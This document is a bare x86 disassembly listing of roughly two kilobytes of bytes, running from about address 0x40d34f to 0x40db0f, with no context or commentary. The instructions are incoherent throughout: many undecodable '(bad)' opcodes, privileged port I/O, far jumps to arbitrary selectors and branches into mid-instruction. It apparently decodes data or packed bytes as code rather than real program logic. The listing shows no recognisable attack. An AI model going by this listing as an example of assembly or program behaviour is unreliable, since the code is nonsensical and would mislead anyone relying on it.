  40d34f:	lea    edi,[edx+eiz*4+0x66869325]
  40d356:	sub    bh,al
  40d358:	pop    esi
  40d359:	aas    
  40d35a:	xchg   ebp,eax
  40d35b:	pop    ss
  40d35c:	jnp    0xf38677b5
  40d362:	ins    BYTE PTR es:[edi],dx
  40d363:	dec    eax
  40d364:	xchg   ecx,eax
  40d365:	pop    eax
  40d366:	sub    eax,0xd86baad3
  40d36b:	imul   dh
  40d36d:	mov    BYTE PTR ds:0x12988b7e,bh
  40d373:	sbb    ch,ah
  40d375:	mov    ds:0xecd3e491,al
  40d37a:	sbb    eax,0x3a128988
  40d37f:	dec    ecx
  40d380:	sbb    DWORD PTR [edi-0x1bb79b61],edi
  40d386:	sbb    bh,BYTE PTR [ebx+esi*8-0x50b6c075]
  40d38d:	stos   DWORD PTR es:[edi],eax
  40d38e:	dec    esp
  40d38f:	and    al,0x86
  40d391:	(bad)  
  40d392:	les    edx,FWORD PTR [ecx+0x50]
  40d395:	sbb    edx,DWORD PTR [ebx]
  40d397:	dec    ebp
  40d398:	je     0x40d372
  40d39a:	imul   cx,ax,0x9089
  40d39f:	rcl    DWORD PTR [ebx],cl
  40d3a1:	mov    al,0x1
  40d3a3:	sbb    al,BYTE PTR [edi+0x6d6b9762]
  40d3a9:	into   
  40d3aa:	or     al,0x50
  40d3ac:	outs   dx,BYTE PTR ds:[esi]
  40d3ad:	xchg   esi,eax
  40d3ae:	out    0x5a,al
  40d3b0:	mov    eax,0xe86cf7ad
  40d3b5:	out    0xd5,eax
  40d3b7:	mov    ebx,0xc15b1c50
  40d3bc:	lods   eax,DWORD PTR ds:[esi]
  40d3bd:	ret    0xec68
  40d3c0:	test   BYTE PTR [ebx],bh
  40d3c2:	pusha  
  40d3c3:	call   0xab255d1b
  40d3c8:	or     ebx,DWORD PTR [esp+edx*4+0x1e073a78]
  40d3cf:	xor    DWORD PTR [edx-0x739d6842],esi
  40d3d5:	(bad)  
  40d3d6:	push   esi
  40d3d7:	push   ds
  40d3d8:	(bad)  
  40d3da:	xchg   ebp,eax
  40d3db:	ss or  esi,esp
  40d3de:	mov    bl,0x9e
  40d3e0:	jae    0x40d3ce
  40d3e2:	pushf  
  40d3e3:	out    dx,eax
  40d3e4:	pop    ss
  40d3e5:	cli    
  40d3e6:	(bad)  
  40d3e7:	outs   dx,BYTE PTR ds:[esi]
  40d3e8:	jae    0x40d393
  40d3ea:	pop    ebp
  40d3eb:	sbb    esi,DWORD PTR [eax+0xc]
  40d3ee:	pop    ecx
  40d3ef:	lods   al,BYTE PTR ds:[esi]
  40d3f0:	jge    0x40d38c
  40d3f2:	sub    ebx,DWORD PTR [eax+0x41bb935b]
  40d3f8:	mov    ds:0x52d4c37,eax
  40d3fd:	imul   ecx,DWORD PTR [edi+0x47771187],0x65
  40d404:	(bad)  
  40d405:	mov    edi,0xe50abecd
  40d40a:	mov    edx,0x41574011
  40d40f:	icebp  
  40d410:	stos   BYTE PTR es:[edi],al
  40d411:	push   cs
  40d412:	xor    esi,DWORD PTR [ebp+0x71]
  40d415:	mov    bl,ah
  40d417:	xchg   ebp,eax
  40d418:	push   cs
  40d419:	inc    esi
  40d41a:	xchg   DWORD PTR ds:0xb19c1704,edx
  40d420:	cwde   
  40d421:	jns    0x40d3dc
  40d423:	mov    eax,ds:0xe6619c53
  40d428:	loopne 0x40d408
  40d42a:	lods   eax,DWORD PTR ds:[esi]
  40d42b:	out    0xa,al
  40d42d:	rcl    DWORD PTR [esi-0x12],0xf9
  40d431:	cmp    DWORD PTR [edi],edi
  40d433:	ja     0x40d40f
  40d435:	call   0x99a1:0x8b3c0d62
  40d43c:	mov    esp,0x17c0456f
  40d441:	ss inc esp
  40d443:	cmp    bl,BYTE PTR [edx-0x23e8c250]
  40d449:	(bad)  
  40d44b:	mov    bl,ch
  40d44d:	inc    esp
  40d44e:	inc    eax
  40d44f:	inc    esp
  40d450:	xor    eax,0x21449243
  40d455:	je     0x40d445
  40d457:	pop    esi
  40d458:	(bad)  
  40d459:	into   
  40d45a:	enter  0x3135,0xd1
  40d45e:	loop   0x40d3fb
  40d460:	adc    eax,0x4009e543
  40d465:	cs jmp 0xaf3f:0x4138b0b2
  40d46d:	mov    ah,0x73
  40d46f:	inc    esi
  40d470:	mov    esp,0xba0964dc
  40d475:	shl    BYTE PTR [eax+edi*2],1
  40d478:	jb     0x40d44e
  40d47a:	xor    cl,BYTE PTR [ebx+eiz*8-0x66]
  40d47e:	adc    BYTE PTR gs:[ecx],dh
  40d481:	or     bh,dh
  40d483:	enter  0x4e76,0x44
  40d487:	jecxz  0x40d41c
  40d489:	je     0x40d4dc
  40d48b:	mov    al,BYTE PTR [esp+ebx*4+0x3a]
  40d48f:	fs mov esi,0xb5a0dee
  40d495:	stos   DWORD PTR es:[edi],eax
  40d496:	lea    ebx,[eax+0x1d]
  40d499:	or     BYTE PTR [ebp-0x3f20b44c],cl
  40d49f:	gs jl  0x40d446
  40d4a2:	pop    edi
  40d4a3:	mov    bl,0x5b
  40d4a5:	mov    esp,0xfdbf0bd8
  40d4aa:	sub    DWORD PTR [ecx-0x6d47461a],eax
  40d4b0:	loopne 0x40d48e
  40d4b2:	and    edx,0x6e57a108
  40d4b8:	(bad)  
  40d4b9:	aam    0xb0
  40d4bb:	fistp  WORD PTR [ecx+ebx*2-0x3e]
  40d4bf:	mov    ds:0xd888954b,al
  40d4c4:	jmp    0xe251c078
  40d4c9:	adc    al,0xaa
  40d4cb:	inc    edi
  40d4cc:	retf   
  40d4cd:	data16 mov al,ds:0x18d961ad
  40d4d3:	cdq    
  40d4d4:	sub    eax,0x5a69a639
  40d4d9:	lahf   
  40d4da:	leave  
  40d4db:	cs inc esp
  40d4dd:	ror    DWORD PTR ds:0x451848ca,1
  40d4e3:	mov    esp,0xe12789b3
  40d4e8:	mov    esi,0x5a85eaf2
  40d4ed:	push   0xcb668eed
  40d4f2:	pop    edi
  40d4f3:	stos   BYTE PTR es:[edi],al
  40d4f4:	inc    edi
  40d4f5:	aaa    
  40d4f6:	or     cl,BYTE PTR [eax+0x4a3923b9]
  40d4fc:	mov    edi,0x9f655ab
  40d501:	xchg   DWORD PTR [edi+0x1a],esi
  40d504:	pushf  
  40d505:	retf   0xfc45
  40d508:	jmp    0x40d4c1
  40d50a:	mov    al,bl
  40d50c:	sbb    dl,cl
  40d50e:	dec    esp
  40d50f:	ss mov bl,0xa6
  40d512:	mov    esp,0xf42cba87
  40d517:	dec    ecx
  40d518:	repz add eax,0xe6559bfa
  40d51e:	retf   
  40d51f:	and    cl,ch
  40d521:	popa   
  40d522:	outs   dx,DWORD PTR ds:[esi]
  40d523:	repz mov cl,0x25
  40d526:	push   esp
  40d527:	ret    0x5097
  40d52a:	fdivr  DWORD PTR [eax]
  40d52c:	scas   eax,DWORD PTR es:[edi]
  40d52d:	jno    0x40d4b4
  40d52f:	and    DWORD PTR [ecx-0x5151abec],0x8f3e9a7f
  40d539:	pop    ebp
  40d53a:	(bad)  
  40d53b:	punpckhwd mm5,QWORD PTR [ebx+0x3090bd02]
  40d542:	add    eax,0x6589570e
  40d547:	cmp    ch,BYTE PTR [edx+0xfc104c6]
  40d54d:	fcmovnu st,st(3)
  40d54f:	pop    esi
  40d550:	js     0x40d4ed
  40d552:	and    ebp,DWORD PTR [ecx-0x6a]
  40d555:	xchg   dl,dl
  40d557:	cmp    DWORD PTR [ebx],0x23
  40d55a:	int3   
  40d55b:	xor    BYTE PTR [ebx-0x4fb9c3dd],bl
  40d561:	and    dl,BYTE PTR [ecx-0x43914529]
  40d567:	pop    es
  40d568:	mov    bh,0x62
  40d56a:	aaa    
  40d56b:	out    0x23,al
  40d56d:	test   eax,0x7eda2049
  40d572:	pop    esi
  40d573:	push   ecx
  40d574:	push   eax
  40d575:	push   ss
  40d576:	arpl   WORD PTR [ebp-0x10],bx
  40d579:	fsub   DWORD PTR [edi+0x68]
  40d57c:	jge    0x40d524
  40d57e:	sbb    BYTE PTR [ebx-0x24d6d73a],cl
  40d584:	dec    ecx
  40d586:	lock push esp
  40d588:	cmp    al,ch
  40d58a:	cmc    
  40d58b:	sar    DWORD PTR [edi],0x5f
  40d58e:	dec    esi
  40d58f:	push   0x1068b76e
  40d594:	hlt    
  40d595:	pop    ds
  40d596:	fadd   DWORD PTR [ebx-0x13]
  40d599:	and    edx,0xdcb3b850
  40d59f:	jl     0x40d594
  40d5a1:	sub    dl,al
  40d5a3:	inc    esi
  40d5a4:	pop    ebp
  40d5a5:	cli    
  40d5a6:	add    al,0x72
  40d5a8:	inc    ebx
  40d5a9:	js     0x40d5a8
  40d5ab:	je     0x40d62c
  40d5ad:	mov    dl,0x3c
  40d5af:	and    eax,0xf0b91ef4
  40d5b4:	jmp    0x6590:0xc6193e92
  40d5bb:	mov    ds:0xa3978de9,al
  40d5c0:	jno    0x40d563
  40d5c2:	mov    bh,0x1
  40d5c4:	neg    BYTE PTR [esi-0x46]
  40d5c7:	cmc    
  40d5c8:	pop    ebp
  40d5c9:	mov    al,0x54
  40d5cb:	jbe    0x40d5dd
  40d5cd:	in     al,0x54
  40d5cf:	std    
  40d5d0:	mov    ebx,0xabdd0e78
  40d5d5:	jp     0x40d62a
  40d5d7:	test   DWORD PTR [ebp+ecx*2+0x7b226b74],0xe597667f
  40d5e2:	cwde   
  40d5e3:	retf   
  40d5e4:	mov    al,0xc1
  40d5e6:	scas   al,BYTE PTR es:[edi]
  40d5e7:	pop    ecx
  40d5e8:	dec    edx
  40d5e9:	ss cwde 
  40d5eb:	dec    esp
  40d5ec:	loopne 0x40d59e
  40d5ee:	sbb    eax,esi
  40d5f0:	dec    edi
  40d5f1:	sbb    BYTE PTR [edx],dl
  40d5f3:	fwait
  40d5f4:	mov    ebp,DWORD PTR [ecx]
  40d5f6:	int3   
  40d5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f8:	jno    0x40d5a2
  40d5fa:	jnp    0x40d5aa
  40d5fc:	inc    edx
  40d5fd:	xor    eax,0xd1e97ac2
  40d602:	aaa    
  40d603:	xor    DWORD PTR [ebp-0x22128453],edx
  40d609:	sbb    DWORD PTR [esi-0x43c1a753],esi
  40d60f:	out    dx,al
  40d610:	out    0x12,al
  40d612:	adc    DWORD PTR [edi+0x35e59716],0x64
  40d619:	adc    eax,0x46facc4b
  40d61e:	fdiv   DWORD PTR [edx+0x54275694]
  40d624:	push   ecx
  40d625:	pop    ds
  40d626:	xchg   edi,eax
  40d627:	add    al,0x1b
  40d629:	inc    esi
  40d62a:	and    eax,0xc2fc3e0d
  40d62f:	ss or  eax,0x94528a8
  40d635:	mov    esp,0x82ce7063
  40d63a:	mov    ebx,0x8c026746
  40d63f:	arpl   ax,cx
  40d641:	fld    QWORD PTR [esi+0x1ab716a7]
  40d647:	xor    esi,DWORD PTR [esi+0x2aed8ed2]
  40d64d:	(bad)  
  40d64e:	clc    
  40d64f:	test   DWORD PTR [ecx],edx
  40d651:	(bad)  
  40d652:	ins    BYTE PTR es:[edi],dx
  40d653:	lahf   
  40d654:	mul    BYTE PTR [esi+0x52]
  40d657:	cdq    
  40d658:	jnp    0x40d683
  40d65a:	fidivr WORD PTR [ebp+ebx*1+0x37]
  40d65e:	sub    DWORD PTR [ebx+eax*1-0x4],esi
  40d662:	std    
  40d663:	ja     0x40d5ef
  40d665:	and    al,0x96
  40d667:	sbb    BYTE PTR [ebx+0x8ce9964],ah
  40d66d:	or     eax,DWORD PTR [edi+0x9]
  40d670:	arpl   WORD PTR [edx-0x55],bx
  40d673:	cmp    eax,0xad966577
  40d678:	leave  
  40d679:	ret    0xe364
  40d67c:	loop   0x40d682
  40d67e:	cli    
  40d67f:	sub    ecx,edx
  40d681:	aaa    
  40d682:	aaa    
  40d683:	mov    dl,0x19
  40d685:	stos   BYTE PTR es:[edi],al
  40d686:	jo     0x40d6fc
  40d688:	mov    eax,0xa9fccb18
  40d68d:	dec    esp
  40d68e:	popa   
  40d68f:	sub    eax,0x456c481
  40d694:	push   edi
  40d695:	xor    ebp,DWORD PTR [edi+0x7f]
  40d698:	fist   DWORD PTR [ecx-0x493c4fd3]
  40d69e:	xchg   ebp,eax
  40d69f:	xlat   BYTE PTR ds:[ebx]
  40d6a0:	xchg   ebx,eax
  40d6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6a2:	push   ebx
  40d6a3:	jbe    0x40d63e
  40d6a5:	push   eax
  40d6a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6a7:	mov    edx,0x7a40e5e4
  40d6ac:	inc    ebx
  40d6ad:	cmp    bh,bl
  40d6af:	stos   DWORD PTR es:[edi],eax
  40d6b0:	mov    BYTE PTR [eax],bl
  40d6b2:	push   eax
  40d6b3:	add    edx,esi
  40d6b5:	pushf  
  40d6b6:	jp     0x40d63c
  40d6b8:	dec    edx
  40d6b9:	fld    TBYTE PTR [ecx+0x28e062ce]
  40d6bf:	xchg   BYTE PTR [esp+edx*4-0x648c7507],dh
  40d6c6:	shl    DWORD PTR [esi+eax*4],0x67
  40d6ca:	add    eax,0x37befbb0
  40d6cf:	retf   0xd20b
  40d6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6d3:	dec    ebx
  40d6d4:	loop   0x40d6e3
  40d6d6:	lods   eax,DWORD PTR ds:[esi]
  40d6d7:	aam    0x71
  40d6d9:	lods   eax,DWORD PTR ds:[esi]
  40d6da:	dec    ecx
  40d6db:	pop    ecx
  40d6dc:	jbe    0x40d6ef
  40d6de:	xchg   esp,eax
  40d6df:	(bad)  
  40d6e0:	aam    0x10
  40d6e2:	fidiv  DWORD PTR [edi+0x3d]
  40d6e5:	xor    eax,0x91c60f11
  40d6ea:	popf   
  40d6eb:	or     esp,0xd
  40d6ee:	pop    esp
  40d6ef:	xchg   BYTE PTR [edx+0x5856ec7c],dl
  40d6f5:	sub    al,0x21
  40d6f7:	jecxz  0x40d705
  40d6f9:	fld    TBYTE PTR [ecx]
  40d6fb:	dec    eax
  40d6fc:	adc    eax,0x5f866a6
  40d701:	xor    BYTE PTR [edi+0x4368e117],dl
  40d707:	xchg   ecx,eax
  40d708:	pop    eax
  40d709:	psllq  mm2,QWORD PTR [ecx]
  40d70c:	rcl    BYTE PTR [edx],0x42
  40d70f:	pushf  
  40d710:	push   ebx
  40d711:	dec    ebp
  40d712:	pop    ds
  40d713:	mov    eax,ds:0xe07bc219
  40d718:	cmp    DWORD PTR [ecx+esi*8+0x4d],edi
  40d71c:	out    0xde,eax
  40d71e:	or     al,0x19
  40d721:	inc    edx
  40d722:	jmp    0x40d784
  40d724:	jns    0x40d6c9
  40d726:	inc    esi
  40d727:	outs   dx,DWORD PTR ds:[esi]
  40d728:	xor    dl,bl
  40d72a:	and    eax,0x4ffd4376
  40d72f:	in     eax,dx
  40d730:	push   0x15774c
  40d735:	mov    al,0xdb
  40d737:	in     eax,dx
  40d738:	fwait
  40d739:	inc    ebx
  40d73a:	ins    BYTE PTR es:[edi],dx
  40d73b:	pop    ebx
  40d73c:	ds pop ebp
  40d73e:	out    0x90,eax
  40d740:	xchg   DWORD PTR [ebx-0x32],eax
  40d743:	jae    0x40d6ed
  40d745:	mov    DWORD PTR [eax],edi
  40d747:	mov    ch,0x91
  40d749:	test   eax,0x10ae643b
  40d74e:	ror    DWORD PTR [ebp+0x50],0xf
  40d752:	sbb    ecx,DWORD PTR [edi-0x58]
  40d755:	fs ds sub eax,0x4d242c19
  40d75c:	jl     0x40d720
  40d75e:	in     eax,dx
  40d75f:	jecxz  0x40d7c3
  40d761:	fistp  WORD PTR [eiz*4+0x6854a6ee]
  40d768:	or     DWORD PTR [ecx+eax*1],esi
  40d76b:	add    bh,BYTE PTR [ebx+edi*2-0x2a]
  40d76f:	add    eax,0x95145edc
  40d774:	sbb    al,BYTE PTR [esi+0x3a861254]
  40d77a:	leave  
  40d77b:	test   al,0xb8
  40d77d:	mov    edx,0xbe84c0c1
  40d782:	jp     0x40d7a1
  40d784:	out    dx,eax
  40d785:	pop    ss
  40d786:	pop    edi
  40d787:	add    DWORD PTR [ecx-0x5d850d35],eax
  40d78d:	cmp    eax,0xf2488665
  40d792:	shr    BYTE PTR [esi+0x2f8072f6],0x60
  40d799:	mov    esp,0x473cd3c1
  40d79e:	mov    eax,?
  40d7a0:	shl    BYTE PTR [edx-0x34],cl
  40d7a3:	stos   DWORD PTR es:[edi],eax
  40d7a4:	mov    ch,0xd9
  40d7a6:	sar    BYTE PTR [ebx+ebx*2],1
  40d7a9:	xor    BYTE PTR [ebx],bh
  40d7ab:	aad    0xe1
  40d7ad:	(bad)  [edx+0x54c35c0d]
  40d7b3:	mov    bh,0xbb
  40d7b5:	fisttp WORD PTR [ebx+0x4]
  40d7b8:	arpl   WORD PTR [eax+0xd],bx
  40d7bb:	ret    
  40d7bc:	sub    ah,BYTE PTR [esi]
  40d7be:	mov    al,0x5
  40d7c0:	test   eax,0xaf79aa22
  40d7c5:	mov    eax,0xb55a371a
  40d7ca:	xor    edi,DWORD PTR [ebx+0x26]
  40d7cd:	daa    
  40d7ce:	lods   al,BYTE PTR ds:[esi]
  40d7cf:	aas    
  40d7d0:	add    eax,0x357b53af
  40d7d5:	in     al,0x19
  40d7d7:	shl    DWORD PTR [esi+eax*8],cl
  40d7da:	push   edx
  40d7db:	ins    DWORD PTR es:[edi],dx
  40d7dc:	enter  0x6977,0xb5
  40d7e0:	stos   DWORD PTR es:[edi],eax
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	(bad)  
  40d7e3:	sub    al,0x7e
  40d7e5:	cdq    
  40d7e6:	mov    bh,0x16
  40d7e8:	inc    ebx
  40d7e9:	lods   eax,DWORD PTR ds:[esi]
  40d7ea:	xor    BYTE PTR [esi+0x377fbdea],0x6a
  40d7f1:	ret    0xeb5d
  40d7f4:	(bad)  
  40d7f5:	mov    ebx,0xd47e537d
  40d7fa:	add    DWORD PTR [edi-0x3b],ebp
  40d7fd:	mov    ds:0x89543fc6,al
  40d802:	in     al,dx
  40d803:	aam    0x73
  40d805:	mov    esi,0x7f552131
  40d80a:	mov    dl,0x13
  40d80c:	in     eax,dx
  40d80d:	xlat   BYTE PTR ds:[ebx]
  40d80e:	sbb    ch,BYTE PTR [esi-0x545ec285]
  40d814:	nop
  40d815:	mov    ds:0x9b4dbcf,eax
  40d81a:	mov    bh,0x2
  40d81c:	cwde   
  40d81d:	mov    eax,ds:0xf7965047
  40d822:	test   DWORD PTR [eax-0x2a],edx
  40d825:	push   edx
  40d826:	stc    
  40d827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d828:	jbe    0x40d86f
  40d82a:	rcr    esi,1
  40d82c:	adc    eax,0xb2659358
  40d831:	loopne 0x40d852
  40d833:	mov    WORD PTR [edx-0x54],gs
  40d836:	sbb    BYTE PTR [ebx+edx*1],ah
  40d839:	je     0x40d80c
  40d83b:	jmp    0x942f:0x7577b2a5
  40d842:	shl    DWORD PTR [esi+0x7e6af1ce],0xf9
  40d849:	test   eax,0x82bc2a3d
  40d84e:	mov    BYTE PTR [ebp+0x459fecb6],dh
  40d854:	and    BYTE PTR [edx-0x30],dl
  40d857:	push   ecx
  40d858:	ret    
  40d859:	dec    ebx
  40d85a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d85b:	jge    0x40d880
  40d85d:	add    eax,esi
  40d85f:	mov    al,0xd5
  40d861:	xor    esi,DWORD PTR [edi+0x3126d374]
  40d867:	mov    bh,0xce
  40d869:	maxps  xmm6,XMMWORD PTR [esi+0x6d]
  40d86d:	leave  
  40d86e:	xor    ah,0x2d
  40d871:	mov    ds:0x75f013cf,al
  40d876:	mov    ecx,0x7808d160
  40d87b:	sbb    eax,DWORD PTR [ecx+0x58392b99]
  40d881:	adc    DWORD PTR [edx-0x13],ebp
  40d884:	lods   eax,DWORD PTR ds:[esi]
  40d885:	cmp    eax,0xe2540162
  40d88a:	adc    esi,0x3
  40d88d:	push   cs
  40d88e:	or     DWORD PTR [ebx],esi
  40d890:	mov    eax,0xc9e7d78e
  40d895:	fsub   QWORD PTR ss:[eax+eiz*2-0x4f6ed745]
  40d89d:	dec    esp
  40d89e:	push   edi
  40d89f:	out    0x91,eax
  40d8a1:	mov    ecx,0xc909c6a8
  40d8a6:	pop    ebp
  40d8a7:	pop    esp
  40d8a8:	pop    ds
  40d8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8aa:	push   ecx
  40d8ab:	enter  0x5cf8,0xab
  40d8af:	clc    
  40d8b0:	cmp    DWORD PTR [edx+0x36ece67a],edx
  40d8b6:	ret    0xa4a2
  40d8b9:	(bad)  
  40d8ba:	fsubrp st(2),st
  40d8bc:	je     0x40d84f
  40d8be:	cwde   
  40d8bf:	adc    eax,0xa1aad11e
  40d8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c5:	sub    al,0x22
  40d8c7:	loopne 0x40d88c
  40d8c9:	dec    edx
  40d8ca:	mov    bl,0x96
  40d8cc:	adc    DWORD PTR [eax-0x4773ded0],0xffffff8c
  40d8d3:	fnop   
  40d8d5:	pop    es
  40d8d6:	out    dx,al
  40d8d7:	jne    0x40d8c4
  40d8d9:	fsub   QWORD PTR [edi]
  40d8db:	(bad)  
  40d8dc:	push   edi
  40d8dd:	sar    BYTE PTR [edx],0xdf
  40d8e0:	xchg   edx,eax
  40d8e1:	out    dx,al
  40d8e2:	hlt    
  40d8e3:	and    BYTE PTR [edx],0xc3
  40d8e6:	pop    ecx
  40d8e7:	or     BYTE PTR [esp+edx*1-0x4b],cl
  40d8eb:	mov    al,ds:0x8fa53d12
  40d8f0:	dec    edi
  40d8f1:	adc    eax,0xc911f742
  40d8f6:	fs jns 0x40d8a7
  40d8f9:	mov    esp,0xd38690c7
  40d8ff:	xchg   ecx,eax
  40d900:	ins    DWORD PTR es:[edi],dx
  40d901:	and    esp,DWORD PTR [eax+0x53]
  40d904:	pop    ecx
  40d905:	xor    DWORD PTR [eax],ebp
  40d907:	cmp    edi,edi
  40d909:	mov    ds:0x32a9584,al
  40d90e:	fnstenv [edi]
  40d910:	bound  ecx,QWORD PTR [ebx+0xe16aa84]
  40d916:	repnz ss push es
  40d919:	lds    eax,FWORD PTR [edx+0x9ffb7f1]
  40d91f:	inc    edx
  40d920:	pushf  
  40d921:	in     al,0xc0
  40d923:	inc    edx
  40d924:	test   BYTE PTR [edx],ah
  40d926:	mov    eax,ds:0x15b79fc8
  40d92b:	rcr    DWORD PTR [ebx],0xda
  40d92e:	repnz shl eax,1
  40d931:	call   0xc89fb3fa
  40d936:	jns    0x40d8d5
  40d938:	mov    esp,0x7465fabd
  40d93d:	call   0xd54efe53
  40d942:	gs call 0x9e1e:0x4aa9b3b3
  40d94a:	pop    ecx
  40d94b:	adc    BYTE PTR [ebp+0x128d98b2],bl
  40d951:	pop    ebx
  40d952:	push   eax
  40d953:	jmp    0x40d9a0
  40d955:	or     eax,esp
  40d957:	aad    0x6e
  40d959:	cli    
  40d95a:	aad    0xc2
  40d95c:	outs   dx,BYTE PTR ds:[esi]
  40d95d:	int3   
  40d95e:	sar    BYTE PTR [ecx-0x3356decd],1
  40d964:	ss imul esp,ecx,0x698b9a6c
  40d96b:	push   ebp
  40d96c:	xchg   edx,eax
  40d96d:	out    dx,eax
  40d96e:	fstp   QWORD PTR [edx+0x2c927795]
  40d974:	or     al,0xf
  40d976:	cdq    
  40d977:	and    ch,BYTE PTR [eax+0x7]
  40d97a:	push   ds
  40d97b:	add    ch,BYTE PTR [eax+0x5a]
  40d97e:	mov    edi,0x5217ded9
  40d983:	inc    ebx
  40d984:	push   esi
  40d985:	das    
  40d986:	fdivp  st(5),st
  40d988:	mov    dl,0x86
  40d98a:	push   eax
  40d98b:	or     cl,dh
  40d98d:	pusha  
  40d98e:	and    bl,BYTE PTR [esi+edx*8+0x2d48e427]
  40d995:	adc    esp,DWORD PTR [ecx+0x5]
  40d998:	jbe    0x40d986
  40d99a:	pop    edx
  40d99b:	shl    BYTE PTR [ecx-0x3ddedaf3],0x9e
  40d9a2:	leave  
  40d9a3:	xchg   esi,eax
  40d9a4:	mov    esp,0x2e156795
  40d9a9:	fcomp  QWORD PTR [ecx-0x53]
  40d9ac:	dec    esi
  40d9ad:	adc    al,0x5c
  40d9af:	add    DWORD PTR [edx+edx*2],0xffffffe5
  40d9b3:	jl     0x40d94d
  40d9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9b6:	pop    esp
  40d9b7:	rcr    DWORD PTR [edi+0x2c],0xf1
  40d9bb:	aaa    
  40d9bc:	or     BYTE PTR [esi+0x1f],bh
  40d9bf:	fsubr  DWORD PTR [ecx+0x33]
  40d9c2:	add    dh,cl
  40d9c4:	jbe    0x40da38
  40d9c6:	jg     0x40da18
  40d9c8:	(bad)  
  40d9c9:	jbe    0x40d99f
  40d9cb:	add    DWORD PTR ds:0xb3bd844a,esi
  40d9d1:	inc    edx
  40d9d2:	sbb    ch,BYTE PTR [ecx-0x34]
  40d9d5:	ins    DWORD PTR es:[edi],dx
  40d9d6:	je     0x40d9d7
  40d9d8:	adc    eax,DWORD PTR [ebx+0x9]
  40d9db:	dec    esp
  40d9dc:	and    eax,0xfd7e7585
  40d9e1:	int3   
  40d9e2:	jno    0x40d9eb
  40d9e4:	sbb    DWORD PTR [edx-0x5c],esp
  40d9e7:	ja     0x40da4f
  40d9e9:	dec    edi
  40d9ea:	dec    edi
  40d9eb:	shl    al,0xdf
  40d9ee:	mov    edi,0xc4d2eda4
  40d9f3:	add    BYTE PTR [ebx],al
  40d9f5:	(bad)  
  40d9f6:	cli    
  40d9f7:	mov    dh,0x94
  40d9f9:	(bad)  
  40d9fa:	not    DWORD PTR [ecx+0x5f56d898]
  40da00:	in     eax,0x20
  40da02:	jle    0x40da18
  40da04:	call   0xb4350e80
  40da09:	cmc    
  40da0a:	or     al,0x89
  40da0c:	fsub   QWORD PTR [eax-0x63ab1a17]
  40da12:	sar    DWORD PTR [esi+0x3f],1
  40da15:	aas    
  40da16:	test   bl,0x2b
  40da19:	xor    BYTE PTR [eax-0x6f],ah
  40da1c:	dec    ebx
  40da1d:	ficomp WORD PTR [eax]
  40da1f:	adc    DWORD PTR [ebx],0x5ed8c1d5
  40da25:	fistp  DWORD PTR [ebx+eiz*4]
  40da28:	ja     0x40da5f
  40da2a:	lds    ebx,FWORD PTR [edi+0x6f68c237]
  40da30:	in     eax,0xa8
  40da32:	pop    edx
  40da33:	ja     0x40da8f
  40da35:	scas   al,BYTE PTR es:[edi]
  40da36:	cmp    ebx,edx
  40da38:	push   ecx
  40da39:	(bad)  [ebx-0x3b01a1c1]
  40da3f:	xor    al,0xb5
  40da41:	mov    ebp,0x78eee342
  40da46:	and    dh,ah
  40da48:	lods   al,BYTE PTR ds:[esi]
  40da49:	jmp    0x3225:0x86bc81fa
  40da50:	pop    esi
  40da51:	lods   eax,DWORD PTR ds:[esi]
  40da52:	jae    0x40da7f
  40da54:	xor    edx,DWORD PTR [edx+esi*4-0x7b4cdc68]
  40da5b:	sbb    dl,0x57
  40da5e:	or     DWORD PTR [esi],0xffffffc0
  40da61:	jmp    0x40da3a
  40da63:	jne    0x40da10
  40da65:	ret    0x644c
  40da68:	jl     0x40da38
  40da6a:	mov    cl,0x2e
  40da6c:	xchg   DWORD PTR [esi-0x17412b90],ebx
  40da72:	ret    
  40da73:	xor    BYTE PTR [ebx+0x44],bl
  40da76:	mov    esp,0xf9f93bd6
  40da7b:	dec    ecx
  40da7c:	fs cmp eax,0xa99d8aa6
  40da83:	and    dl,BYTE PTR [esi-0x5d]
  40da86:	mov    ebp,0x7a976115
  40da8b:	add    al,0x6e
  40da8d:	icebp  
  40da8e:	inc    eax
  40da8f:	mov    eax,0x6ef6cb00
  40da94:	jne    0x40da92
  40da96:	gs call 0x1c95:0x5e7f798b
  40da9e:	mov    WORD PTR [eax],?
  40daa0:	cmp    al,0x59
  40daa2:	xchg   edx,eax
  40daa3:	add    al,0xe9
  40daa5:	pusha  
  40daa6:	adc    DWORD PTR [edi],edi
  40daa8:	push   esp
  40daa9:	shl    BYTE PTR [eax+0x16],0xa8
  40daad:	jmp    DWORD PTR [ebx]
  40daaf:	dec    edi
  40dab0:	cld    
  40dab1:	imul   ecx,DWORD PTR [ebx],0x67
  40dab4:	add    ebx,eax
  40dab6:	adc    eax,0x871cb217
  40dabb:	jge    0x40da4d
  40dabd:	jl     0x40dae6
  40dabf:	test   al,0x8c
  40dac1:	out    0x58,eax
  40dac3:	sbb    BYTE PTR [ebx],dh
  40dac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dac6:	cmp    eax,0x3199456b
  40dacb:	fsubrp st(3),st
  40dacd:	adc    BYTE PTR [edi],0xea
  40dad0:	add    eax,0xca2fe757
  40dad5:	adc    DWORD PTR ds:0x7dfd3fd8,0x685e9300
  40dadf:	sub    al,0xeb
  40dae1:	or     ebp,DWORD PTR [edx+0x21]
  40dae4:	in     al,dx
  40dae5:	jo     0x40db11
  40dae7:	push   0x3f
  40dae9:	loope  0x40db57
  40daeb:	sub    DWORD PTR [ecx+0x5e],eax
  40daee:	mov    ebp,0x38bcc522
  40daf3:	mov    dl,0x3
  40daf5:	jne    0x40db58
  40daf7:	(bad)  
  40daf8:	dec    esp
  40daf9:	cld    
  40dafa:	adc    DWORD PTR [edi+ebx*2-0x4035bcc8],esi
  40db01:	fstp   st(4)
  40db03:	sbb    DWORD PTR [ebx-0x39cf0387],edi
  40db09:	jmp    ecx
  40db0b:	int    0x1b
  40db0d:	xchg   edx,eax
  40db0e:	inc    edx
  40db0f:	push   0xda8655d0
